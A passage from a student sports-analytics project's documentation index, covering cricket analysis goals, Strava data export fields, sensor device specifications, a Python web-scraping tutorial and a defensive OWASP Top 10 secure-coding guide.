winning the toss in T20 World Cup matches.  ","version":"Next","tagName":"h3"},{"title":"T20 World Cup Venue Performance Analysis​","type":1,"pageTitle":"Sports Performance Overview","url":"/redback-documentation/docs/project-3/research/sports-performance-overview#t20-world-cup-venue-performance-analysis","content":" Objective​  The aim is to analyse win ratios associated with each venue, offering insights into how location impacts team performance. A time series analyse aims to trace historical performance patterns at these venues over time. The objective is to provide strategic perspective on decision-making effectiveness at different grounds, crucial for teams in planning and strategising for matches at various venues.  ","version":"Next","tagName":"h3"},{"title":"Key Player Performance Metric Analysis​","type":1,"pageTitle":"Sports Performance Overview","url":"/redback-documentation/docs/project-3/research/sports-performance-overview#key-player-performance-metric-analysis","content":" Objective​  This analysis concentrates on evaluating performance metrics to identify the top eleven players from the 2023 Cricket World Cup. By analysing key metrics like strike rate and balls faced, it aims to reveal underlying performance patterns. The objective is to assist team management in selecting the most effective players for future tournaments and identify promising young talents for development.  ","version":"Next","tagName":"h3"},{"title":"Team of the Tournament Analysis​","type":1,"pageTitle":"Sports Performance Overview","url":"/redback-documentation/docs/project-3/research/sports-performance-overview#team-of-the-tournament-analysis","content":" Objective​  The objective is to select the best 11 players for the IPL 2023 team of the tournament, categorising them into specific roles. This analysis aims to serve as a critical tool for understanding player performance across different roles, aiding in recognising the most impactful players of the tournament.  ","version":"Next","tagName":"h3"},{"title":"Player Performance Modelling​","type":1,"pageTitle":"Sports Performance Overview","url":"/redback-documentation/docs/project-3/research/sports-performance-overview#player-performance-modelling","content":" Objective​  This analysis focuses on developing tailored models to forecast key player performances in batting and bowling. The goal is provide an accurate and detailed forecast for player performance, assisting in strategic planning and player selection. ","version":"Next","tagName":"h3"},{"title":"Strava Bulk Export Data Description","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-3/research/strava-bulk-export-data-description","content":"","keywords":"","version":"Next"},{"title":"Top level directory​","type":1,"pageTitle":"Strava Bulk Export Data Description","url":"/redback-documentation/docs/project-3/research/strava-bulk-export-data-description#top-level-directory","content":" The top level directory contains many .csv files - most of which are not relevant or only slightly relevant for our analyses. There is often around 40+ such files and only a small number contain information that we will use:  activities.csv: A summary tab;e of the workouts included in the doeanload. This contains many summary fields such as duration, distance, average and maximum speed, average and maximum power, and average and maximum cadence. It also includes a link to a .fit, .gpx to .tcx file for the workout that contains the specific data recorded for that individual workout. Note: The average speed is on recorded if there is a device for the workout measuring speed. It is not calculated from elapsed moving time and duration if there has been no speed recording device. bikes.csv: Details of bikes that the account holder has entered into their Strava account. comments.csv: Comments that have been recorded by the user for any of the recorded workouts. This is free form text and the comments can be anything from a description of the workout to saying hello to a fellow Strava user. profile.csv: Information about the account holder including name, email address, state, country, sex and weight.  Strava will provide estimates for some fields in the activities.csv file rather than actual measurements. This is true for average power and we want to exclude any entries that are not actual measurements for this field. The underlying .fit file will show actual measured values where they exist.  ","version":"Next","tagName":"h2"},{"title":"Sub-directories​","type":1,"pageTitle":"Strava Bulk Export Data Description","url":"/redback-documentation/docs/project-3/research/strava-bulk-export-data-description#sub-directories","content":" The download also creates four sub-directories:  activities: Contains the .fit, .gpx to .tcx files for each workout where they have been recorded. clubs: Details of any Clubs the account holder has defined or joined. media: Any photos or videos that the account holder has uploaded with their workouts. routes: Any routes that the account holder has defined in Strava.  Of these sub-directories, the one that is used by our project is the activities directory.  ","version":"Next","tagName":"h2"},{"title":"Activity file fields​","type":1,"pageTitle":"Strava Bulk Export Data Description","url":"/redback-documentation/docs/project-3/research/strava-bulk-export-data-description#activity-file-fields","content":" The fields included in the .fit files for rides with power data measured are:  altitude: Altitude above sea level (m). cadence: Pedal cadence, indicating the rate at which a cyclist is pedaling in revolutions per minute (RPM). combined_pedal_smoothness: A measure of how smoothly the cyclist is pedaling, indicating pedaling efficiency. distance: The cumulative distance traveled during the cycling activity (m). enhanced_altitude: An enhanced measure of altitude (m). enhanced_speed: Speed calculated using GPS or sensor data, typically measured in kilometres per hour (km/h). gps_accuracy: The accuracy level of the GPS signal (m). grade: The incline or decline grade of the road, expressed as a percentage. heart_rate: The cyclist's heart rate in beats per minute (BPM). left_right_balance: The balance between the left and right pedal strokes. left_torque_effectiveness: The efficiency of torque application during the left pedal stroke. position_lat: The latitude coordinate from the GPS data. position_long: The longitude coordinate from the GPS data. power: The cyclist's power output in (W). right_torque_effectiveness: The efficiency of torque application during the right pedal stroke. speed: The cycling speed, typically measured (km/h). temperature: The ambient temperature (Celsius). timestamp: The date and time for each recorded data point.  ","version":"Next","tagName":"h2"},{"title":"Data features and characteristics​","type":1,"pageTitle":"Strava Bulk Export Data Description","url":"/redback-documentation/docs/project-3/research/strava-bulk-export-data-description#data-features-and-characteristics","content":" There are numerous unusual features of the dataset. The notable aspects are:  Average speed is only included in activities.csv when there is a speed measurement device and will not be calculated from distance and moving time. Average power in the activities.csv may be calculated rather than measured and is not a reliable indicator of whether a power measurement device has been used for the activity. Instead, only Weighted Average Power.  ","version":"Next","tagName":"h2"},{"title":"Data manipulations​","type":1,"pageTitle":"Strava Bulk Export Data Description","url":"/redback-documentation/docs/project-3/research/strava-bulk-export-data-description#data-manipulations","content":" The measurements for individual rides are provided in .fit.gz files. These files are compressed .fit files which is a binary file format. A Python program was created to read these files and write them out as CSVs for easier processing.  The python code and notebook related to this exploration is available at Strava Data Exploration.  Importing a Strava workout database  ","version":"Next","tagName":"h2"},{"title":"1. Export the data from Strava​","type":1,"pageTitle":"Strava Bulk Export Data Description","url":"/redback-documentation/docs/project-3/research/strava-bulk-export-data-description#1-export-the-data-from-strava","content":" To import a Strava workout database, you will need to export the data from Strava. This can be done by following these steps:  Log in to your Strava account.Click on your profile picture in the top right corner of the screen.Select 'Settings' from the dropdown menu.Click on 'My Account' in the left-hand menu.Scroll down to the 'Download or Delete Your Account' section.Click on 'Get Started' under 'Download Your Data'.Select the data range you want to export and click 'Request Your Archive'.Wait for Strava to prepare your data and send you an email with a link to download it.Download the data and extract the files to a location on your computer.  ","version":"Next","tagName":"h2"},{"title":"2. Clean the data​","type":1,"pageTitle":"Strava Bulk Export Data Description","url":"/redback-documentation/docs/project-3/research/strava-bulk-export-data-description#2-clean-the-data","content":" The Strava Data Exploration notebook contains code to clean the data and export it to the csv format used by the prediction models.  To clean the data:  Set the 'source_path' variable in the cell marked as 2.1 to the location of the Strava data export.Set the 'athlete_id' variable to the value that you want to use to identify this athlete. The example uses 'TRI001' as the data is from a triathlete and it is the first triathlete included.Run the three cells under the 2.1 heading to clean up the data and filter the Ride, Run and Swim data that contains enough information for the models to use.Run the cell under the 2.2 heading to export the data to the csv format used by the prediction models.  ","version":"Next","tagName":"h2"},{"title":"3. Load the data into the GitHub repository​","type":1,"pageTitle":"Strava Bulk Export Data Description","url":"/redback-documentation/docs/project-3/research/strava-bulk-export-data-description#3-load-the-data-into-the-github-repository","content":" Once you have cleaned the data, you can load it into the GitHub repository for use by the prediction models. This will involve checking in the 'extended_activities_athlete_id.csv' file that was created in the 2.2 cell and all the .csv.gz files for the individual session data.  Create the pull request that includes these files. ","version":"Next","tagName":"h2"},{"title":"Aerodynamic Bike Resistance Monitor Specifications","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-3/sensors/bike_resistance_monitor","content":"","keywords":"","version":"Next"},{"title":"Description​","type":1,"pageTitle":"Aerodynamic Bike Resistance Monitor Specifications","url":"/redback-documentation/docs/project-3/sensors/bike_resistance_monitor#description","content":" This device is designed to attach to the front of a bicycle, aimed at estimating aerodynamic resistance. It integrates with speed, power, and incline measurements to help cyclists and coaches assess the aerodynamic efficiency of different riding positions and equipment setups.  ","version":"Next","tagName":"h2"},{"title":"Key Features​","type":1,"pageTitle":"Aerodynamic Bike Resistance Monitor Specifications","url":"/redback-documentation/docs/project-3/sensors/bike_resistance_monitor#key-features","content":" Air Flow Sensors: High-sensitivity sensors measure the flow and velocity of air around the front of the bike to estimate aerodynamic drag.Able to detect subtle changes in air resistance caused by different bike setups and rider positions. Integration with Bike Computers: Connects seamlessly with existing bike computers and sensors for speed, power, and incline data.Uses combined data to calculate and display an estimate of the coefficient of drag area (CdA). Mounting System: Easy-to-install mounting bracket designed to securely attach to a variety of bike front sections.Aerodynamically shaped to minimize its own impact on resistance measurements. Wireless Connectivity: Bluetooth (and possibly ANT+) compatibility for wireless data transmission to other cycling devices and smartphones.Enables post-ride analysis through a dedicated mobile app or compatible bike computers.Could eventually allow for real-time aerodynamic feedback during rides. Data Analysis and Feedback: Algorithms provide insights into how different riding positions or equipment affect aerodynamic drag.Allows for A/B testing of gear and positioning to find the most aerodynamically efficient setup. Power Supply: Powered by a rechargeable battery with at least 2 hours of runtime and ideally up to 10 hours.USB-C charging port for quick and convenient charging. Durability and Resistance: Robust, waterproof construction ensures functionality in all weather conditions.Impact-resistant materials protect the device during falls or rough rides would be ideal as long as they do not conflict with the other requirements by making the device too bulky or inconvenient.  ","version":"Next","tagName":"h2"},{"title":"Applications​","type":1,"pageTitle":"Aerodynamic Bike Resistance Monitor Specifications","url":"/redback-documentation/docs/project-3/sensors/bike_resistance_monitor#applications","content":" Ideal for road cyclists, triathletes, and cycling teams focused on performance optimization.Useful in both training and competitive environments, particularly in time trials and triathlons where aerodynamics play a crucial role. ","version":"Next","tagName":"h2"},{"title":"Web Scraping in Python","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-3/research/web-scraping-in-python","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Web Scraping in Python","url":"/redback-documentation/docs/project-3/research/web-scraping-in-python#introduction","content":" Web scraping is a powerful technique used to extract data from websites, providing valuable information. It involves using software tools to navigate and interact with web pages, download and parse HTML, and extract relevant information. Web scraping allows users to gather data from various online sources, transforming unstructured web data into a structured format that can be analyzed, stored, or used for various applications. However, it's important to note that web scraping should be performed ethically and in compliance with the terms of service of the websites being accessed.  ","version":"Next","tagName":"h2"},{"title":"Python Web Scraping libraries​","type":1,"pageTitle":"Web Scraping in Python","url":"/redback-documentation/docs/project-3/research/web-scraping-in-python#python-web-scraping-libraries","content":" Urllib3: A powerful HTTP client library for performing HTTP requests programmatically. Handles HTTP headers, retries, redirects, SSL verification, connection pooling, and proxying. BeautifulSoup: Used to parse HTML and XML documents. Provides an API to navigate HTML document trees and extract tags, meta titles, attributes, text, and other content. Known for robust error handling. MechanicalSoup: Automates the interaction between a web browser and a website. Offers a high-level API for web scraping that simulates human behavior. Allows interaction with HTML forms, clicking buttons, and other user-like actions. Requests: A simple and powerful library for making HTTP requests. Designed to be easy to use with a clean and consistent API. Handles GET and POST requests, cookies, authentication, and other HTTP features. Widely used in web scraping due to its simplicity. Selenium: Automates web browsers like Chrome, Firefox, and Safari. Simulates human interaction with websites, allowing actions such as clicking buttons, filling forms, and scrolling pages. Used for testing web applications and automating repetitive tasks. Pandas: Enables storing and manipulating data in various formats (CSV, Excel, JSON, SQL databases). Useful for cleaning, transforming, and analyzing data extracted from websites.  These libraries offer diverse functionalities, from HTTP requests to HTML parsing and browser automation, making them essential tools for web scraping tasks in Python. Choose the library that best suits your specific scraping needs and project requirements.  ","version":"Next","tagName":"h2"},{"title":"Web Scraping Process​","type":1,"pageTitle":"Web Scraping in Python","url":"/redback-documentation/docs/project-3/research/web-scraping-in-python#web-scraping-process","content":" ","version":"Next","tagName":"h2"},{"title":"1. Identify Data Sources​","type":1,"pageTitle":"Web Scraping in Python","url":"/redback-documentation/docs/project-3/research/web-scraping-in-python#1-identify-data-sources","content":" Select Relevant Website: Choose a website for scraping.  ","version":"Next","tagName":"h3"},{"title":"2. Choose Web Scraping Tools​","type":1,"pageTitle":"Web Scraping in Python","url":"/redback-documentation/docs/project-3/research/web-scraping-in-python#2-choose-web-scraping-tools","content":" Select appropriate Web Scraping libraries from the ones mentioned above.  ","version":"Next","tagName":"h3"},{"title":"3. Understand Website Structure​","type":1,"pageTitle":"Web Scraping in Python","url":"/redback-documentation/docs/project-3/research/web-scraping-in-python#3-understand-website-structure","content":" Understand the website structure by inspecting HTML code. Right-click on the webpage, select &quot;Inspect,&quot; and note element class names and IDs.  ","version":"Next","tagName":"h3"},{"title":"4. Write Scraping Code​","type":1,"pageTitle":"Web Scraping in Python","url":"/redback-documentation/docs/project-3/research/web-scraping-in-python#4-write-scraping-code","content":" Send an HTTP GET request using requests. Parse HTML code with BeautifulSoup. Extract relevant data and store it in a Pandas dataframe. Add a delay between requests to avoid overwhelming the website.  Additional Help:  read_html function in Pandas: Handy for extracting tabular data from HTML web pages. Data Source url : ['https://www.espncricinfo.com/records/tournament/team-match-results/icc-cricket-world-cup-2023-24-15338'] The following code gets the list of all tables in the url.The tables will be indexed in the order in which they occur in the web page.  Code:  tables = pd.read\\_html(url)   Using BeautifulSoup  Beautiful Soup is a Python library designed for pulling data from HTML files. It is particularly useful when dealing with web pages containing tables with links to other pages. In the scenario presented below, the 'Ground' and 'Scorecard' columns each contain links to additional webpages.  ","version":"Next","tagName":"h3"},{"title":"Steps to Use BeautifulSoup:​","type":1,"pageTitle":"Web Scraping in Python","url":"/redback-documentation/docs/project-3/research/web-scraping-in-python#steps-to-use-beautifulsoup","content":" HTTP Request: Send an HTTP request to the webpage and store the HTML content as text. response = requests.get('url\\_of\\_the\\_webpage') html\\_content = response.text Create BeautifulSoup Object: Create a BeautifulSoup object to parse the HTML using the obtained response. soup = BeautifulSoup(html\\_content, 'html.parser') Locate HTML Table: Locate the HTML table using appropriate tags and attributes. table = soup.find('table', {'id': 'table1'}) Extract Links: Initialize an empty list to store links. Iterate through the rows of the table, find all anchor tags, and append the links to the list. for row in table.find\\_all('tr'): for link in row.find\\_all('a',href= True): #Get the value of 'href' attribute (link) href=link\\['href'\\] links.append(href) To filter specific categories from the mixed list of links, apply slicing techniques. Run a loop through the list and use the read_html function to extract tables from each link. Print Results: To view the extracted links, simply print the list. Note: Detailed code for the example can be found at https://github.com/redbackoperations/Projects/blob/main/Sports Performance Analysis/frontend/Cricket Analysis/web_scraping_cric_analysis.ipynb  ","version":"Next","tagName":"h2"},{"title":"5. Export Extracted Data​","type":1,"pageTitle":"Web Scraping in Python","url":"/redback-documentation/docs/project-3/research/web-scraping-in-python#5-export-extracted-data","content":" Export scraped data as a CSV file using Pandas.  ","version":"Next","tagName":"h3"},{"title":"6. Verify Extracted Data​","type":1,"pageTitle":"Web Scraping in Python","url":"/redback-documentation/docs/project-3/research/web-scraping-in-python#6-verify-extracted-data","content":" Open the CSV file to ensure the data has been successfully scraped and stored.  Dynamic Content: For websites with dynamic loading (e.g., JavaScript-based content), consider using tools like Selenium for web scraping.    ","version":"Next","tagName":"h3"},{"title":"Instructions - Step by Step​","type":1,"pageTitle":"Web Scraping in Python","url":"/redback-documentation/docs/project-3/research/web-scraping-in-python#instructions---step-by-step","content":" Web scraping involves extracting data from websites. Here's a step-by-step summary of using Python to scrape website data:  Choose the Website and Webpage URL Inspect the website Installing the important libraries Write the Python code Exporting the gathered data Confirming the collected data    ","version":"Next","tagName":"h2"},{"title":"Authors​","type":1,"pageTitle":"Web Scraping in Python","url":"/redback-documentation/docs/project-3/research/web-scraping-in-python#authors","content":" This comprehensive guide on web scraping was created collaboratively by Ramya Sekar and Adarsh Kallungal Sivaram. Ramya created the page and set the initial structure, while Adarsh added valuable insights and extra information to enrich the content. ","version":"Next","tagName":"h2"},{"title":"Core Temperature and Sweat Level Running Tracker Specifications","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-3/sensors/running_temp_and_sweat","content":"","keywords":"","version":"Next"},{"title":"Description:​","type":1,"pageTitle":"Core Temperature and Sweat Level Running Tracker Specifications","url":"/redback-documentation/docs/project-3/sensors/running_temp_and_sweat#description","content":" The device is designed for runners, providing actionable insights into core body temperature and sweat levels during training sessions and competitions. This tracker helps athletes optimize their performance by monitoring physiological responses in real-time, aiding in hydration and heat management strategies.  ","version":"Next","tagName":"h2"},{"title":"Key Features:​","type":1,"pageTitle":"Core Temperature and Sweat Level Running Tracker Specifications","url":"/redback-documentation/docs/project-3/sensors/running_temp_and_sweat#key-features","content":" Core Temperature Sensor: Precision sensor embedded in a comfortable, adjustable strap to monitor core body temperature accurately.Real-time temperature monitoring to detect critical heat stress conditions and prevent overheating. Sweat Analysis Sensors: Integrated sensors in the strap measure sweat rate and electrolyte balance, providing insights into hydration status.Alerts the runner when rehydration is necessary to maintain optimal performance and safety. Design and Comfort: Lightweight and breathable material for the strap, designed for minimal discomfort and interference during runs.Ergonomic design that fits securely on a wide range of body types. Wireless Connectivity: Syncs data wirelessly with smartphones, smartwatches, and other compatible devices via Bluetooth (and possibly ANT+).Compatible with popular Redback Operations web app for detailed analysis and historical data tracking. Real-Time Feedback: Vibrations and audio alerts through connected devices for immediate feedback on critical changes in temperature and sweat levels.Customizable notifications based on pre-set thresholds for temperature and hydration markers. Data Logging and Analysis: Extensive data recording capabilities to log temperature and sweat data for post-run analysis.Helps in planning training sessions and recovery based on physiological responses to previous workouts. Battery Life and Charging: Rechargeable battery with up to 12 hours of continuous monitoring capability.Quick charge via USB-C. Water Resistance: Water-resistant up to 50 meters, suitable for training in various weather conditions and cross-training activities. ","version":"Next","tagName":"h2"},{"title":"Safe Code Guide","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-3/SafeCodeGuide","content":"","keywords":"","version":"Next"},{"title":"BRIEF OVERVIEW​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#brief-overview","content":" This guide is based on the way that SecDevOps team members are advised to review pull requests from other projects. To reduce complexity for junior members and to ensure the most important security risks are looked out for, we check code against the OWASP top 10 web application critical security risks.  OWASP stands for the Open Web Application Security Project. It is an open-source project that reaches out to key industry players every 4-5 years and collects data on the most critical cyber security issues pertaining to application development. Based on the data they compose the top 10 most important issues and release this is in their awareness document. The most recent one is OWASP Top 10:2021, with the next one coming soon around mid 2025.  This source of security issues is well regarded in industry and is a perfect starting point for developers without much cyber security training. If you want to read more about it, the links below point to information from their website and good quality third parties.  [OWASP Top Ten Overview](https://owasp.org/www-project-to-[2021 Version – Extra Information](https://owasp.org/-10 Minute Youtube Video – By Cyber CitadelFor those interested in LLM Security: How the Top 10 Apply for LLM’s - IBMFor those who want to experiment with live examples of insecure web applications: OWASP Top 10 Examples - GitHub  In this guide I will be going through key things to look out for and examples from past semester’s pull requests in your project. Hopefully this will make it easier to understand and increase your ability to prevent un-safe code production from the start of the development life cycle.  Note: A lot of the examples are like pseudo code and wouldn’t be used as is, however, they are helpful for understanding the principle so that you can apply/avoid the preventative measure or risk respectively.    ","version":"Next","tagName":"h2"},{"title":"1. BROKEN ACCESS CONTROL​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#1-broken-access-control","content":" ","version":"Next","tagName":"h2"},{"title":"Gist​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#gist","content":" Access to resources and functionality should be enforced based on who is accessing it. Everything should be denied by default with any access given with the least amount of privilege possible. This is referred to as whitelisting.  ","version":"Next","tagName":"h3"},{"title":"Look Out For​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#look-out-for","content":" API’s having the same permissions for all methods. This isn’t just important for “setters” like POST, but “getters” like GET. For example, you may centre your concern around preventing any damage to data through malicious POST and DELETE operations. However, that is more of a concern for maintaining the state of a system, not protecting it from getting data stolen with a GET request. Exposing sensitive data through complex manipulation in the back end. For example, as illustrated in the example, SQL queries could result columns being returned that hold sensitive information. In the case of your exercise data there may be location information. To prevent this there should be a good understanding of data fields and data manipulation effects.  ","version":"Next","tagName":"h3"},{"title":"Example​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#example","content":"   This example is quite basic and clearly not safe by using the wildcard (*). However, it highlights the concept of a data query returning unwanted fields (latitude and longitude).    ","version":"Next","tagName":"h3"},{"title":"2. CRYPTOGRAPHIC FAILURES​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#2-cryptographic-failures","content":" ","version":"Next","tagName":"h2"},{"title":"Gist​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#gist-1","content":" Are the correct protocols, tools, and standards being used to protect data at rest and in transit? If not, they should be updated to be as secure as “reasonably practicable” (it is a balancing act as too much security can slow down software or add more complexity). For example, it would be unnecessary to use multi factor authentication for a login that is only used for marketing purposes since this would slow down the user for no extra gain.  ","version":"Next","tagName":"h3"},{"title":"Look Out For​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#look-out-for-1","content":" Try to use HTTPS over HTTP. Encrypt sensitive data when moving it between stores. Don’t place sensitive data in the public facing GitHub repository. Regularly check the encryption versions used if manually encrypting data on servers. Use the latest ones once they have been tested. Store passwords as their hashes.  ","version":"Next","tagName":"h3"},{"title":"Example​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#example-1","content":"   This is similar to a common issue that comes up in pull request reviews, where login credentials are hardcoded for request code. Similarly, even if the passwords are stored on a database on the server, no extra effort is required for attackers to work out passwords once stolen if they are plain text.    ","version":"Next","tagName":"h3"},{"title":"3. INJECTION​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#3-injection","content":" ","version":"Next","tagName":"h2"},{"title":"Gist​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#gist-2","content":" Input from the user should not be used directly without checks and changes if necessary. Even if the data is being stored or used somewhere that is not vital to the program, or consists of sensitive information, it can still be used maliciously with clever syntax tricks.  ","version":"Next","tagName":"h3"},{"title":"Look Out For​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#look-out-for-2","content":" Escape characters which have logical meaning in the language that is working with the data. Something mentioned on the OWASP website which I think is pretty cool is preventing users from entering data structure names that cannot be escaped. One way to get around this with SQL tables is to name them differently to their front-end display. This is what I used in the example instead of a standard SQL injection with special characters. Parameterize database queries.  ","version":"Next","tagName":"h3"},{"title":"Example​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#example-2","content":"   Here the table name is “obfuscated” slightly by not using an obvious name like “users”.    ","version":"Next","tagName":"h3"},{"title":"4. INSECURE DESIGN​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#4-insecure-design","content":" ","version":"Next","tagName":"h2"},{"title":"Gist​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#gist-3","content":" Insecure design's a funny one because it isn't a specific feature of a piece of software that you should avoid or implement to prevent security risks. Instead it is more about how to approach the development process to ensure that security flaws are not built in to your system. Essentially you should consider the security risks of each part of your design and included risk assessments as you go.  ","version":"Next","tagName":"h3"},{"title":"Look Out For​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#look-out-for-3","content":" Think about how an attacker might take advantage of a process, data storage, or core piece of logic. Perform security checks regularly, trying to adhere to a secure DevOps practice, or &quot;SecDevOps&quot;. Use industry proven designs if possible, or seek advice from others with security experience when creating designs in-house. IMPORTANT: Don't leave security to last in the development process!  ","version":"Next","tagName":"h3"},{"title":"Example​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#example-3","content":"   The example I have used here is from the project's web app code. This is definitely not poorly written or designed as the sign in function was not fully setup when I was writing this :) If this code was left as is it would be prone to a brute force attack. This is because there is no functionality to stop allowing the client to try their username and password combination after a certain amount of tries. ­    ","version":"Next","tagName":"h3"},{"title":"5. SECURITY MISCONFIGURATION​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#5-security-misconfiguration","content":" ","version":"Next","tagName":"h2"},{"title":"Gist​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#gist-4","content":" The software and environment settings should be planned, documented, reviewed and kept consistent. Make sure you check any 3rd party tools for default settings which add security risks to your system.  ","version":"Next","tagName":"h3"},{"title":"Look Out For​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#look-out-for-4","content":" Use whitelist approach with permission configurations. Keep configurations consistent across all environments and setups of the software. Don't give global access to make configuration changes. Consult other team members before making changes such as ports or user access. Remove/change default credentials because these are very easy to find online with searches on forums.  ","version":"Next","tagName":"h3"},{"title":"Example​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#example-4","content":"   In this example an API token is hardcoded into the code for the request. As mentioned above this is a common issue in pull request reviews. To use use tokens in code without including them in plain text you can store them with 3rd party services like cloud token hosting, or you can save them as environment variables on the server running the code.    ","version":"Next","tagName":"h3"},{"title":"6. VULNERABLE AND OUTDATED COMPONENTS​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#6-vulnerable-and-outdated-components","content":" ","version":"Next","tagName":"h2"},{"title":"Gist​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#gist-5","content":" Modern software is made up of a large number of inter-reliant parts that include in-house and 3rd party developers. Updates and patching are not automatic and require up to date knowledge of changes.  ","version":"Next","tagName":"h3"},{"title":"Look Out For​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#look-out-for-5","content":" Document each component in the system as you build it to gain insight into dependency mappings. Use automation tools to scan code repositories for outdated packages or ones with known security risks. When adding dependencies make sure to subscribe to change alerts and newsletters. Always perform testing when updating or patching, not just when changing code.  ","version":"Next","tagName":"h3"},{"title":"Example​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#example-5","content":"   To illustrate how important it is to track your dependencies is, this single line includes the JavaScript Keras package. Within that package, 18 other packages are included, and within them who knows how many. It is impossible nowadays to write code from scratch or with just the standard libraries, and it is also impossible to directly verify every dependency relation within imported packages. That is why it is important to ensure all other areas of the system are secure, and that you use tools that can perform deep dependency scanning for you.    ","version":"Next","tagName":"h3"},{"title":"7. IDENTIFICATION AND AUTHENTICATION FAILURES​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#7-identification-and-authentication-failures","content":" ","version":"Next","tagName":"h2"},{"title":"Gist​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#gist-6","content":" Similar to broken access control (3). Have strong user authentication features and layering to prevent single points of entry. Don't allow bot-like actions to be used to bypass authentication with randomly generated user identification.  ","version":"Next","tagName":"h3"},{"title":"Look Out For​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#look-out-for-6","content":" Set up multi-factor authentication when the resource or functionality being accessed has high value, data sensitivity, or power. Do not ever store passwords in plain text. If they are stolen there is no more protection. Prevent brute force attacks by stopping too many repeated attempts at login. Test user accounts for weak passwords that would be included in most dictionaries.  ","version":"Next","tagName":"h3"},{"title":"Example​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#example-6","content":"   This is a sneaky method to prevent bad actors from accessing your system's resources. It works by baiting port sniffing with unused ports that have no services listening on them. As soon as someone sniffs one of the bait ports their IP is blocked entirely from every port.    ","version":"Next","tagName":"h3"},{"title":"8. SOFTWARE AND DATA INTEGRITY FAILURES​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#8-software-and-data-integrity-failures","content":" ","version":"Next","tagName":"h2"},{"title":"Gist​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#gist-7","content":" Assume the worst of other pieces of software and data. Whenever possible verify that software and external data is from who it says it is through signatures. Don't trust anything outside of your own artifacts.  ","version":"Next","tagName":"h3"},{"title":"Look Out For​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#look-out-for-7","content":" Check digital signatures. Perform file hashes against trusted values to ensure file integrity. Use industry trusted repositories.  ","version":"Next","tagName":"h3"},{"title":"Example​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#example-7","content":"   When downloading any file from an external source, after verifying its identify you should check the hash. This only has meaning when the file provider gives the hash. In the example the script prevents any execution when the files do not match by using 444 with chmod to set it to read only for all users.    ","version":"Next","tagName":"h3"},{"title":"9. SECURITY LOGGING AND MONITORING FAILURES​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#9-security-logging-and-monitoring-failures","content":" ","version":"Next","tagName":"h2"},{"title":"Gist​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#gist-8","content":" You can't do anything about a security issue if you don't know about it. Monitoring and proper logging is required to gain valuable insight into issues so that they can be resolved.  ","version":"Next","tagName":"h3"},{"title":"Look Out For​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#look-out-for-8","content":" Only log useful error information to people within the company. Providing too much information can aid bad actors. When setting up internal logging functions in code, give as much information as possible. Monitor groups of events and try to collate information. Send important logs off to remote data stores so that they cannot be deleted by bad actors.  ","version":"Next","tagName":"h3"},{"title":"Example​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#example-8","content":"   In this example when the error thrown by the system is HIGH or above it may have to be kept for legal reasons such as sensitive user data leaks. It uses two sample functions. One to log to the usual place so that it is picked up by team members (the event itself should trigger monitoring), 